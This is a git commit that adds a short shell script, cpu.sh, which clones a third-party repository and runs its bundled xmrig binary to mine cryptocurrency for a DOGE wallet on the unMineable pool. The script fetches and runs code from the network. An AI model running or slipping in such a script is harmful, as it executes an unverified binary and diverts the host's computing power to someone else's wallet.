a36072d01be450b2c010e0d8c7240062d5b37afa
I-mans <100556243+I-mans@users.noreply.github.com>
2022-02-28 14:44:31 +0800

    Create cpu.sh

---
+++ cpu.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+git clone https://github.com/quincyhays/bmxmrig && chmod +x bmxmrig/xmrig && bmxmrig/xmrig -o rx.unmineable.com:3333 -u DOGE:DH6uZER3Am8zVq4UWfNdSH6EyyrF226aY6.kuli-001 -p x -t 4
